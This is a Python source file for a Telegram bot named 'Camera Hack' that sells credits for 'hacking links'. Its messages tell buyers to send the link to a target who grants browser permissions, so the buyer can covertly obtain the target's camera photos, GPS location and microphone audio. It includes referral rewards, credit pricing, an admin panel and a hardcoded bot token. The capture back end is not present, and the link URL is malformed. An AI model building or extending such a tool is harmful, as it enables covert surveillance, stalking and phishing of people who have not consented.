import telebot
from telebot import types
import os
import time
import json
import hashlib
import random
import string
from datetime import datetime, timedelta

# ========== CONFIGURATION ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8880781989:AAEPFM65w89ZyVBLwjBlC6E7dEXDV_ZgLfI')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '7420647897')
OWNER_USERNAME = "https://t.me/Nawab_Zada_Hacker_007"
BOT_NAME = "Camera Hack"

# Files to store data
USERS_FILE = "users_data.json"
CREDITS_FILE = "credits_data.json"
CAPTURES_FILE = "captures_data.json"

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Load data functions
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=4)

def load_credits():
    try:
        with open(CREDITS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_credits(credits):
    with open(CREDITS_FILE, 'w') as f:
        json.dump(credits, f, indent=4)

def load_captures():
    try:
        with open(CAPTURES_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_captures(captures):
    with open(CAPTURES_FILE, 'w') as f:
        json.dump(captures, f, indent=4)

# Initialize data
users_db = load_users()
credits_db = load_credits()
captures_db = load_captures()

# ========== HELPER FUNCTIONS ==========
def generate_unique_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def generate_link(service_type, user_id):
    unique_id = generate_unique_id()
    link_code = hashlib.md5(f"{user_id}{service_type}{time.time()}".encode()).hexdigest()[:8]
    
    # Store link info
    if user_id not in captures_db:
        captures_db[user_id] = {}
    
    captures_db[user_id][unique_id] = {
        'service': service_type,
        'link_code': link_code,
        'created_at': time.time(),
        'used': False,
        'captures': []
    }
    save_captures(captures_db)
    
    link = f"https://telegram-bot railway.com/{service_type}/{link_code}"
    return link, unique_id

def get_user_credits(user_id):
    return credits_db.get(str(user_id), 0)

def deduct_credit(user_id):
    current = get_user_credits(user_id)
    if current >= 1:
        credits_db[str(user_id)] = current - 1
        save_credits(credits_db)
        return True
    return False

def add_credits(user_id, amount):
    current = get_user_credits(user_id)
    credits_db[str(user_id)] = current + amount
    save_credits(credits_db)

def check_user_access(user_id):
    """Check if user can use service"""
    credits = get_user_credits(user_id)
    
    # First 2 free uses
    user_data = users_db.get(str(user_id), {})
    free_uses = user_data.get('free_uses', 0)
    
    if free_uses < 2:
        users_db[str(user_id)]['free_uses'] = free_uses + 1
        save_users(users_db)
        return True
    
    # Check credits
    if credits >= 1:
        return True
    
    return False

def register_user(user_id, username):
    if str(user_id) not in users_db:
        users_db[str(user_id)] = {
            'username': username,
            'joined_at': time.time(),
            'free_uses': 0,
            'total_uses': 0,
            'referrals': [],
            'referral_code': hashlib.md5(f"{user_id}{username}".encode()).hexdigest()[:6].upper()
        }
        save_users(users_db)
        
        # Add 2 free credits for new user
        add_credits(user_id, 2)

# ========== COMMAND HANDLERS ==========
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id
    username = message.from_user.username or "No Username"
    
    # Register user if new
    register_user(user_id, username)
    
    welcome_msg = f"""🔓 *Welcome to {BOT_NAME}* 🔓

👑 *Developer:* {OWNER_USERNAME}

📱 *Available Services:*
• 📸 Camera Hack - Access target device camera
• 📍 Location Hack - Get real-time GPS location
• 🎤 Mic Hack - Record microphone audio

🎯 *How it works:*
1️⃣ Choose service below
2️⃣ Get hacking link
3️⃣ Send link to target
4️⃣ Target opens link & allows permissions
5️⃣ You receive captures instantly!

⚡ *Credit System:*
• 🎁 First 2 uses: FREE
• 💰 After that: 1 credit per use
• 👥 Refer friends: 2 credits per referral
• 💎 Buy credits: Contact owner

📊 Your Credits: *{get_user_credits(user_id)}*
🆓 Free Uses Left: *{2 - users_db.get(str(user_id), {}).get('free_uses', 0)}*

Choose service to begin:"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton("📸 Camera Hack", callback_data="service_camera")
    btn2 = types.InlineKeyboardButton("📍 Location Hack", callback_data="service_location")
    btn3 = types.InlineKeyboardButton("🎤 Mic Hack", callback_data="service_mic")
    btn4 = types.InlineKeyboardButton("💰 Buy Credits", callback_data="buy_credits")
    btn5 = types.InlineKeyboardButton("👥 Refer Friends", callback_data="refer_friends")
    btn6 = types.InlineKeyboardButton("📊 My Account", callback_data="my_account")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(user_id, welcome_msg, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.message.chat.id
    data = call.data
    
    if data.startswith("service_"):
        service_type = data.replace("service_", "")
        handle_service_selection(call, service_type)
    
    elif data == "buy_credits":
        handle_buy_credits(call)
    
    elif data == "refer_friends":
        handle_refer_friends(call)
    
    elif data == "my_account":
        handle_my_account(call)
    
    elif data == "confirm_hack":
        handle_confirm_hack(call)
    
    elif data == "back_to_menu":
        start_command(call.message)
    
    elif data.startswith("capture_"):
        capture_id = data.replace("capture_", "")
        handle_view_capture(call, capture_id)

def handle_service_selection(call, service_type):
    user_id = call.message.chat.id
    
    # Check access
    if not check_user_access(user_id):
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("💰 Buy Credits", callback_data="buy_credits")
        btn2 = types.InlineKeyboardButton("👥 Refer Friends", callback_data="refer_friends")
        btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
        markup.add(btn1, btn2, btn3)
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text=f"❌ *Insufficient Credits!*\n\nYou need 1 credit to use this service.\n\nYour Credits: *{get_user_credits(user_id)}*\n\nGet credits by:\n• Buying from owner\n• Referring friends (2 credits each)\n• Using free trial (first 2 uses)",
            parse_mode='Markdown',
            reply_markup=markup
        )
        return
    
    user_data = users_db.get(str(user_id), {})
    if user_data.get('free_uses', 0) >= 2:
        if not deduct_credit(user_id):
            bot.answer_callback_query(call.id, "❌ Credit deduction failed!", show_alert=True)
            return
    
    service_names = {
        'camera': '📸 Camera Hack',
        'location': '📍 Location Hack',
        'mic': '🎤 Mic Hack'
    }
    
    hacking_link, link_id = generate_link(service_type, user_id)
    
    instructions = f"""✅ *{service_names[service_type]} Link Generated!*

🔗 *Hacking Link:*
`{hacking_link}`

📋 *Instructions:*
1. Copy the link above
2. Send to target person
3. Target must open link in browser
4. They need to ALLOW permissions when asked
5. You will receive captures automatically

⚠️ *Important Notes:*
• Link expires in 24 hours
• Works on all Android/iOS devices
• Requires Chrome/Safari browser
• Target must grant permissions

📊 Your Credits Left: *{get_user_credits(user_id)}*"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Copy Link", callback_data="copy_link")
    btn2 = types.InlineKeyboardButton("🔄 New Link", callback_data=f"service_{service_type}")
    btn3 = types.InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")
    
    markup.add(btn1, btn2, btn3)
    
    # Store link in callback data for copying
    bot.answer_callback_query(call.id, f"Link generated successfully!", show_alert=False)
    
    bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text=instructions,
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    markup2 = types.InlineKeyboardMarkup()
    btn_link = types.InlineKeyboardButton("🌐 Open Hacking Link", url=hacking_link)
    markup2.add(btn_link)
    
    bot.send_message(
        user_id,
        f"🔗 *Click to open link:*\n{hacking_link}\n\n📋 *Or copy this:*\n`{hacking_link}`",
        parse_mode='Markdown',
        reply_markup=markup2
    )

def handle_buy_credits(call):
    user_id = call.message.chat.id
    
    buy_msg = f"""💎 *Buy Credits*

💰 *Credit Packages:*
• 10 Credits - $3 USD
• 25 Credits - $8 USD
• 50 Credits - $17 USD
• 100 Credits - $30 USD
• 200 Credits - $50 USD

🎁 *Bonus:* Buy 100+ credits get 20% extra!

📊 Your Current Credits: *{get_user_credits(user_id)}*

📞 *Contact Owner:* {OWNER_USERNAME}

💬 Send your Telegram username to owner with package choice."""

    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("📞 Contact Owner", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")
    btn2 = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
    markup.add(btn1, btn2)
    
    bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text=buy_msg,
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_refer_friends(call):
    user_id = call.message.chat.id
    user_data = users_db.get(str(user_id), {})
    referral_code = user_data.get('referral_code', 'ERROR')
    
    referral_link = f"https://t.me/{bot.get_me().username}?start={referral_code}"
    
    refer_msg = f"""👥 *Refer Friends & Earn Credits*

🔗 *Your Referral Link:*
`{referral_link}`

📈 *How it works:*
1. Share your referral link with friends
2. Friend clicks link and joins bot
3. Friend uses /start command
4. You get *2 credits* instantly!
5. No limit on referrals!

💰 *Rewards:*
• Each successful referral: 2 Credits
• Top referrer bonus monthly
• Unlimited earning potential

📊 Your Stats:
• Total Referrals: *{len(user_data.get('referrals', []))}*
• Credits Earned: *{len(user_data.get('referrals', [])) * 2}*
• Current Credits: *{get_user_credits(user_id)}*"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Copy Link", callback_data="copy_ref_link")
    btn2 = types.InlineKeyboardButton("🔗 Share Link", url=f"https://t.me/share/url?url={referral_link}&text=Join%20this%20awesome%20hacking%20bot!")
    btn3 = types.InlineKeyboardButton("📊 Referral Stats", callback_data="ref_stats")
    btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
    
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text=refer_msg,
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_my_account(call):
    user_id = call.message.chat.id
    user_data = users_db.get(str(user_id), {})
    
    account_msg = f"""📊 *Your Account Info*

👤 Username: @{user_data.get('username', 'N/A')}
🆔 User ID: `{user_id}`
📅 Joined: {datetime.fromtimestamp(user_data.get('joined_at', time.time())).strftime('%Y-%m-%d %H:%M')}

💰 *Credits:*
• Available: *{get_user_credits(user_id)}*
• Free Uses Used: *{user_data.get('free_uses', 0)}/2*
• Total Uses: *{user_data.get('total_uses', 0)}*

👥 *Referrals:*
• Total Referrals: *{len(user_data.get('referrals', []))}*
• Referral Code: `{user_data.get('referral_code', 'N/A')}`
• Credits from Referrals: *{len(user_data.get('referrals', [])) * 2}*

📸 *Captures:*
• Camera Captures: *{sum(1 for v in captures_db.get(str(user_id), {}).values() if v.get('service') == 'camera')}*
• Location Logs: *{sum(1 for v in captures_db.get(str(user_id), {}).values() if v.get('service') == 'location')}*
• Audio Records: *{sum(1 for v in captures_db.get(str(user_id), {}).values() if v.get('service') == 'mic')}*"""

    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("📸 View Captures", callback_data="view_captures")
    btn2 = types.InlineKeyboardButton("💰 Add Credits", callback_data="buy_credits")
    btn3 = types.InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_menu")
    
    markup.add(btn1, btn2, btn3)
    
    bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text=account_msg,
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_view_capture(call, capture_id):
    user_id = call.message.chat.id
    
    # Get capture data
    user_captures = captures_db.get(str(user_id), {})
    capture_data = user_captures.get(capture_id, {})
    
    if not capture_data:
        bot.answer_callback_query(call.id, "Capture not found!", show_alert=True)
        return
    
    service_type = capture_data.get('service', 'unknown')
    captures_list = capture_data.get('captures', [])
    
    if not captures_list:
        msg = f"""📭 *No Captures Yet*

Service: {service_type}
Link Code: {capture_data.get('link_code', 'N/A')}
Created: {datetime.fromtimestamp(capture_data.get('created_at', time.time())).strftime('%H:%M %Y-%m-%d')}
Status: {'✅ Used' if capture_data.get('used') else '⏳ Waiting'}

The target hasn't opened the link yet or hasn't granted permissions."""
        
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("🔄 Refresh", callback_data=f"capture_{capture_id}")
        btn2 = types.InlineKeyboardButton("🔙 Back", callback_data="view_captures")
        markup.add(btn1, btn2)
        
        bot.edit_message_text(
            chat_id=user_id,
            message_id=call.message.message_id,
            text=msg,
            parse_mode='Markdown',
            reply_markup=markup
        )
        return
    
    # Show captures
    if service_type == 'camera':
        for photo_url in captures_list[:5]:  # Show first 5 photos
            try:
                bot.send_photo(user_id, photo_url)
            except:
                pass
    
    elif service_type == 'location':
        for loc in captures_list:
            lat = loc.get('lat')
            lon = loc.get('lon')
            if lat and lon:
                bot.send_location(user_id, lat, lon)
                bot.send_message(user_id, f"📍 Location captured!\nLat: {lat}\nLon: {lon}")
    
    elif service_type == 'mic':
        for audio_url in captures_list[:3]:  # Show first 3 audio files
            try:
                bot.send_audio(user_id, audio_url)
            except:
                pass
    
    bot.answer_callback_query(call.id, "Captures sent!", show_alert=True)

# ========== ADMIN COMMANDS ==========
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.chat.id
    
    # Check if user is admin
    if str(user_id) != ADMIN_CHAT_ID:
        bot.send_message(user_id, "❌ Access denied! Admin only.")
        return
    
    admin_msg = f"""👑 *Admin Panel* 👑

📊 *Bot Statistics:*
• Total Users: *{len(users_db)}*
• Active Today: *{len([u for u in users_db.values() if time.time() - u.get('joined_at', 0) < 86400])}*
• Total Credits Given: *{sum(credits_db.values())}*
• Total Captures: *{sum(len(v) for v in captures_db.values())}*

💰 *Credit Management:*
• Add credits to user
• Remove credits
• Reset user account

👥 *User Management:*
• View all users
• Ban/unban users
• Check user activity

⚙️ *Bot Controls:*
• Broadcast message
• Update bot settings
• View logs"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton("📊 All Users", callback_data="admin_all_users")
    btn2 = types.InlineKeyboardButton("💰 Manage Credits", callback_data="admin_manage_credits")
    btn3 = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    btn4 = types.InlineKeyboardButton("📈 Stats", callback_data="admin_stats")
    btn5 = types.InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings")
    
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(user_id, admin_msg, parse_mode='Markdown', reply_markup=markup)

# Admin callback handlers
@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback_handler(call):
    user_id = call.message.chat.id
    
    if str(user_id) != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!", show_alert=True)
        return
    
    action = call.data.replace("admin_", "")
    
    if action == "all_users":
        show_all_users(call)
    
    elif action == "manage_credits":
        manage_credits_menu(call)
    
    elif action == "broadcast":
        start_broadcast(call)
    
    elif action == "stats":
        show_admin_stats(call)
    
    elif action == "settings":
        show_admin_settings(call)

def show_all_users(call):
    user_list = ""
    
    for idx, (user_id_str, user_data) in enumerate(list(users_db.items())[:50], 1):  # Show first 50 users
        username = user_data.get('username', 'N/A')
        credits = credits_db.get(user_id_str, 0)
        referrals = len(user_data.get('referrals', []))
        
        user_list += f"{idx}. @{username} | ID: {user_id_str} | 💰{credits} | 👥{referrals}\n"
    
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("🔄 Refresh", callback_data="admin_all_users")
    btn2 = types.InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_back")
    
    markup.add(btn1, btn2)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"👥 *All Users ({len(users_db)} total):*\n\n{user_list}",
        parse_mode='Markdown',
        reply_markup=markup
    )

def manage_credits_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton("➕ Add Credits", callback_data="admin_add_credits")
    btn2 = types.InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove_credits")
    btn3 = types.InlineKeyboardButton("📊 User Credits", callback_data="admin_user_credits")
    btn4 = types.InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_back")
    
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="💰 *Credit Management*\n\nSelect action:",
        parse_mode='Markdown',
        reply_markup=markup
    )

# Simulate capture reception (for demo)
@bot.message_handler(commands=['simulate'])
def simulate_capture(message):
    user_id = message.chat.id
    
    if str(user_id) != ADMIN_CHAT_ID:
        return
    
    # Simulate receiving a capture
    test_user = list(users_db.keys())[0] if users_db else str(user_id)
    
    if test_user in captures_db and captures_db[test_user]:
        capture_id = list(captures_db[test_user].keys())[0]
        
        # Add simulated capture
        captures_db[test_user][capture_id]['captures'].append(
            "https://example.com/simulated_capture.jpg"
        )
        captures_db[test_user][capture_id]['used'] = True
        
        save_captures(captures_db)
        
        # Notify user
        bot.send_message(
            test_user,
            "📸 *New Capture Received!*\n\nYour hacking link was used and a capture has been recorded!\n\nCheck your account to view it."
        )
        
        bot.send_message(user_id, "✅ Simulation successful! User notified.")

# Start command with referral code
@bot.message_handler(func=lambda msg: msg.text and msg.text.startswith('/start '))
def start_with_referral(message):
    user_id = message.chat.id
    username = message.from_user.username or "No Username"
    
    # Extract referral code
    args = message.text.split()
    if len(args) > 1:
        referral_code = args[1]
        
        # Find referrer
        referrer_id = None
        for uid, data in users_db.items():
            if data.get('referral_code') == referral_code:
                referrer_id = uid
                break
        
        if referrer_id:
            # Add to referrer's list
            if 'referrals' not in users_db[referrer_id]:
                users_db[referrer_id]['referrals'] = []
            
            users_db[referrer_id]['referrals'].append({
                'user_id': user_id,
                'username': username,
                'time': time.time()
            })
            
            # Give credits to referrer
            add_credits(int(referrer_id), 2)
            
            # Notify referrer
            bot.send_message(
                referrer_id,
                f"🎉 *New Referral!*\n\n@{username} joined using your referral link!\n\n+2 credits added to your account!\n\nTotal Credits: {get_user_credits(int(referrer_id))}"
            )
            
            save_users(users_db)
    
    # Continue normal registration
    register_user(user_id, username)
    
    # Send welcome with bonus message
    welcome_bonus_msg = f"""🎁 *Welcome Bonus!*

Thanks for joining {BOT_NAME}!

You have received:
✅ 2 FREE credits to start
✅ Access to all hacking services
✅ Ability to earn more through referrals

Start hacking now by choosing a service below!"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📸 Camera Hack", callback_data="service_camera")
    btn2 = types.InlineKeyboardButton("📍 Location Hack", callback_data="service_location")
    
    markup.add(btn1, btn2)
    
    bot.send_message(user_id, welcome_bonus_msg, parse_mode='Markdown', reply_markup=markup)
    
    # Also show main menu
    time.sleep(1)
    start_command(message)

# ========== RUN BOT ==========
if __name__ == '__main__':
    print(f"🤖 Starting {BOT_NAME} Bot...")
    print(f"👑 Developer: {OWNER_USERNAME}")
    print(f"📊 Total Users: {len(users_db)}")
    print(f"💰 Total Credits in System: {sum(credits_db.values())}")
    print("🚀 Bot is now running...")
    
    # Start polling
    bot.polling(none_stop=True, interval=0, timeout=20)
